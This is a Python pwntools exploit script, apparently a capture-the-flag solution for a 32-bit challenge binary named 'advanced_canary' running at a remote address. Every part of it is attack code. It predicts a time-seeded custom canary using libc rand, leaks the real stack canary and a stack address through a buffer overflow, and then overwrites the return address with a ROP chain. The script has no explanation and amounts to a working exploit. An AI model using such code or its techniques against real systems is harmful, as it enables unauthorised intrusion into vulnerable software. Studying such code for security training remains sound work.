from pwn import *
from ctypes import *

address = '52.199.235.181 '
port = 5555
binary = './advanced_canary'

context.aslr = False
context.binary = binary
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'DEBUG'
context.arch = 'i386'

p = remote(address, port)
e = ELF(binary)

def s(a): return p.send(a)
def sa(a,b): return p.sendafter(a,b)
def sl(a): return p.sendline(a)
def sla(a,b): return p.sendlineafter(a, b)


def r(a): return p.recv(a)
def rl(): return p.recvline()
def ru(a): return p.recvuntil(a)

def i(ss):
    log.info("%s: 0x%x" % (ss, eval(ss)))

rop = ROP(binary)
rop.puts(0x804a0a0)

print rop.dump()
libc = CDLL('/lib/i386-linux-gnu/libc.so.6')
seed = libc.time(0)
print seed 
libc.srand(seed)

a = libc.rand() 
b = libc.rand()
c = libc.rand()
d = libc.rand()
e = libc.rand()
f = libc.rand()
g = libc.rand()
h = libc.rand()
i = libc.rand()
print '%x %x %x %x %x %x' % (a, b, c, d, e, f)
canary = c_int(d * e* f)
canary2 = c_int(g * h * i)
print 'canary: %x' % canary.value

r(4096)
sl('1')
ru('string : ')
s('\xff' * 0x64 + chr(112))
r(4096)
sl('1')
ru('string : ')
sl('A' * 0x64 + p32(0x41414141) + p32(canary.value, sign=True) + '\xff')
ru(p32(canary.value, sign=True) + '\xff')
real_canary = u32('\x00' + r(3))
print '%x' % real_canary
stack = u32(r(4))
print '%x' % stack
r(4096)
sl('1')
ru('string : ')

sl('A' * 0x64 + p32(0xffffffff) + p32(canary2.value, sign=True) + p32(real_canary) + p32(stack) + 'A' * 24 + str(rop) )
sl('2')



p.interactive()
